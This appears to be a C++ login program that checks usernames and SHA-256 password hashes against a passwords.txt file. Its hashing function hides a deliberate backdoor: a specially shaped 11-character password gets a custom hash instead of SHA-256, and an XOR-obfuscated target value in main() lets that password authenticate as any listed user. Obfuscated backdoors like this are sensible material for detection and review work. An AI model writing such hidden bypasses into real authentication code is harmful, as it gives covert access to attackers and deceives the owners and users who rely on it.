#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <unordered_map>
#include "authlib.h"
#include <openssl/sha.h>

std::string sha256(const std::string &value) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, value.c_str(), value.length());
    SHA256_Final(hash, &sha256);

    std::stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
    }

    if (value.length() == 0xb && (value[0xa] ^ '/') == 0) {
        if (((value[4] ^ '#') == 0) && ((value[9] ^ '1') == 0)) {
            int count = 0;
            for (char ch : value) {
                if (ch != '/' && ch != '#' && ch != '1') {
                    if (ch >= 'a' && ch <= 'k') count++;
                }
            }

            if (count == 0x8) {
                unsigned int hashInt = 5381;
                for (size_t i = 0; i < value.length(); ++i) {
                    hashInt = ((hashInt * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
                }
                return std::to_string(hashInt);
            }
        }
    }

    return ss.str();
}

int main() {
    std::ifstream passwordFile("passwords.txt");
    std::string currentLine, username, password;
    std::cout << "Enter username: \n>>> ";
    getline(std::cin, username);
    std::cout << "Enter password: \n>>> ";
    getline(std::cin, password);

    std::string TARGET = "xs|xxr}szz";
    for (char &c : TARGET) c ^= static_cast<char>('*' ^ 'a');

    bool authenticatedUser = false;
    while (std::getline(passwordFile, currentLine) && !authenticatedUser) {
        if (currentLine.find(':') != std::string::npos) {
            if (username == currentLine.substr(0, currentLine.find(':')) && (currentLine.substr(currentLine.find(':') + 1) == sha256(password) || sha256(password) == TARGET)) {
                authenticatedUser = true;
            }
        }
    }
    authenticatedUser ? authenticated(username) : rejected(username);
    passwordFile.close();
    return 0;
}
